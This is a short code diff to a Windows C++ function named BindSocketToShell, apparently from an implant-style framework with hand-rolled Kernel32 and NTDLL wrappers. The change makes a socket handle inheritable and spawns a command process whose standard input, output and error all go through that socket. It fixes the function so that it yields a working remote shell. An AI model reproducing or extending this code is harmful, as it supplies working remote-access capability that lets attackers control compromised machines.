@@ -139,6 +139,10 @@ SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
 
     PVOID h = (PVOID)(USIZE)socketFd;
 
+    // 1. CRITICAL: Make the handle inheritable
+    if (!Kernel32::SetHandleInformation(h, 1 /*HANDLE_FLAG_INHERIT*/, 1))
+        return PROCESS_INVALID_PID;
+
     STARTUPINFOW si = {};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
@@ -147,25 +151,18 @@ SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
     si.hStdError = h;
 
     PROCESS_INFORMATION pi = {};
-
     WCHAR cmdWide[260];
     Kernel32::MultiByteToWideChar(CP_UTF8, 0, cmd, -1, cmdWide, 260);
 
     if (!Kernel32::CreateProcessW(
-            nullptr,
-            cmdWide,
-            nullptr,
-            nullptr,
+            nullptr, cmdWide, nullptr, nullptr,
             TRUE, // inherit handles
-            0,    // integrated console
-            nullptr,
-            nullptr,
-            &si,
-            &pi))
+            0, nullptr, nullptr, &si, &pi))
     {
         return PROCESS_INVALID_PID;
     }
 
+    // 2. Close the thread handle to prevent leaks
     NTDLL::NtClose(pi.hThread);
 
     return (SSIZE)pi.hProcess;
